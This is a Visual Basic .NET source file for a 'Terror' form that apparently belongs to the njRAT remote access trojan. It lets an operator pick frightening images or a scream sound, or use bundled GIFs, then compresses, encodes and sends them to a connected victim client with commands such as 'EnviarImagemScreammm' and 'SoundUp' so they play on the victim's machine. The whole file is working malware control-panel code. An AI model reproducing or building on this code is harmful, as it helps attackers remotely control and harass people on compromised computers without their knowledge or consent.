Imports System.IO
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT
Imports NJRAT.Class7


Public Class FrmTerror

    Inherits Form
    Public c As Client
    Private listViewItem_0 As ListViewItem
    Public Sub New()
        Me.listViewItem_0 = Nothing
        Me.InitializeComponent()

    End Sub

    Public sk As Client

    Private Sub FrmTerror_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If File.Exists(Application.StartupPath & "\Terror\01.gif") Then
            txtLocal.Text = Application.StartupPath & "\Terror\01.gif"
        End If

        If File.Exists(Application.StartupPath & "\Terror\Scream.wav") Then
            TextBox1.Text = Application.StartupPath & "\Terror\Scream.wav"
        Else
            Try
                Dim wavStream As UnmanagedMemoryStream = My.Resources.Scream
                Dim wavBytes(wavStream.Length - 1) As Byte
                Dim binaryReader As New BinaryReader(wavStream)
                binaryReader.Read(wavBytes, 0, wavBytes.Length)

                Using binaryWriter As New BinaryWriter(File.Open(Application.StartupPath & "\Terror\Scream.wav", FileMode.Create))
                    binaryWriter.Write(wavBytes)
                End Using
            Catch ex As Exception
            End Try
        End If

        If Not File.Exists(Application.StartupPath & "\Terror\01.gif") Then
            Try
                My.Resources._01.Save(Application.StartupPath & "\Terror\01.gif")
            Catch ex As Exception
            End Try
        End If

        If Not File.Exists(Application.StartupPath & "\Terror\02.gif") Then
            Try
                My.Resources._02.Save(Application.StartupPath & "\Terror\02.gif")
            Catch ex As Exception
            End Try
        End If

        If Not File.Exists(Application.StartupPath & "\Terror\03.gif") Then
            Try
                My.Resources._03.Save(Application.StartupPath & "\Terror\03.gif")
            Catch ex As Exception
            End Try
        End If

        If Not File.Exists(Application.StartupPath & "\Terror\04.gif") Then
            Try
                My.Resources._04.Save(Application.StartupPath & "\Terror\04.gif")
            Catch ex As Exception
            End Try
        End If

        If Not File.Exists(Application.StartupPath & "\Terror\05.gif") Then
            Try
                My.Resources._05.Save(Application.StartupPath & "\Terror\05.gif")
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub btnPorcurar_Click(sender As Object, e As EventArgs) Handles btnPorcurar.Click
        Try
            Dim AddItem As New OpenFileDialog
            AddItem.Title = "Pick Photo"
            AddItem.Filter = "TODOS ARQUIVOS (*.*)|*.*"
            If AddItem.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim img As Image
                Dim img2 As Bitmap
                img = Image.FromFile(AddItem.FileName)
                img2 = New Bitmap(img)
                img.Dispose()
                PicPrevia.Image = img2
                txtLocal.Text = AddItem.FileName
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub btnEnviar_Click(sender As Object, e As EventArgs) Handles btnEnviar.Click
        If txtLocal.Text = Nothing Then
            MsgBox("Choose your image or search for one to send", MsgBoxStyle.Exclamation, "Info")
        Else

            If File.Exists(txtLocal.Text) Then

                If CheckBox2.Checked = False Then

                    Dim cM As Boolean = True
                    Dim buffer As Byte() = MdFN.SB(Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes(txtLocal.Text), cM)))
                    Dim stream As New MemoryStream
                    Dim s As String = ("EnviarImagemTerrorrr" & Class7.string_1 & New FileInfo(txtLocal.Text).Extension & Class7.string_1)
                    stream.Write(MdFN.SB(s), 0, s.Length)
                    stream.Write(buffer, 0, buffer.Length)

                    c.Send(stream.ToArray)

                Else


                    Dim cM As Boolean = True
                    Dim buffer As Byte() = MdFN.SB(Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes(txtLocal.Text), cM)))
                    Dim stream As New MemoryStream
                    Dim s As String = ("EnviarImagemScreammm" & Class7.string_1 & New FileInfo(txtLocal.Text).Extension & Class7.string_1)
                    stream.Write(MdFN.SB(s), 0, s.Length)
                    stream.Write(buffer, 0, buffer.Length)

                    c.Send(stream.ToArray)


                End If


            Else
                    MsgBox("This picture does not exist or is not found", MsgBoxStyle.Critical, "Info")
            End If

        End If

    End Sub

    Private Sub RB01_CheckedChanged(sender As Object, e As EventArgs) Handles RB01.CheckedChanged
        If RB01.Checked = True Then
            txtLocal.Text = Application.StartupPath & "\Terror\01.gif"
        End If
    End Sub

    Private Sub RB02_CheckedChanged(sender As Object, e As EventArgs) Handles RB02.CheckedChanged
        If RB02.Checked = True Then
            txtLocal.Text = Application.StartupPath & "\Terror\02.gif"
        End If
    End Sub

    Private Sub RB03_CheckedChanged(sender As Object, e As EventArgs) Handles RB03.CheckedChanged
        If RB03.Checked = True Then
            txtLocal.Text = Application.StartupPath & "\Terror\03.gif"
        End If
    End Sub

    Private Sub RB04_CheckedChanged(sender As Object, e As EventArgs) Handles RB04.CheckedChanged
        If RB04.Checked = True Then
            txtLocal.Text = Application.StartupPath & "\Terror\04.gif"
        End If
    End Sub

    Private Sub RB05_CheckedChanged(sender As Object, e As EventArgs) Handles RB05.CheckedChanged
        If RB05.Checked = True Then
            txtLocal.Text = Application.StartupPath & "\Terror\05.gif"
        End If
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        txtLocal.Text = Application.StartupPath & "\Terror\01.gif"
        RB01.Checked = True
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        txtLocal.Text = Application.StartupPath & "\Terror\02.gif"
        RB02.Checked = True
    End Sub

    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        txtLocal.Text = Application.StartupPath & "\Terror\03.gif"
        RB03.Checked = True
    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        txtLocal.Text = Application.StartupPath & "\Terror\04.gif"
        RB04.Checked = True
    End Sub

    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click
        txtLocal.Text = Application.StartupPath & "\Terror\05.gif"
        RB05.Checked = True
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Dim AddItem As New OpenFileDialog
            AddItem.Title = "Pick Wav"
            AddItem.Filter = "WAV File (*.wav)|*.*"
            If AddItem.ShowDialog = Windows.Forms.DialogResult.OK Then
                TextBox1.Text = AddItem.FileName
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If TextBox1.Text = Nothing Then
            MsgBox("Choose your sound effect or search for one to send", MsgBoxStyle.Exclamation, "Info")
        Else

            If File.Exists(TextBox1.Text) Then

                Dim cM As Boolean = True
                Dim buffer As Byte() = MdFN.SB(Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes(TextBox1.Text), cM)))
                Dim stream As New MemoryStream
                Dim s As String = ("SoundUp" & Class7.string_1 & New FileInfo(TextBox1.Text).Extension & Class7.string_1)
                stream.Write(MdFN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)

                c.Send(stream.ToArray)




            Else
                MsgBox("This sound does not exist or is not found", MsgBoxStyle.Critical, "Info")
            End If

        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs)

    End Sub
End Class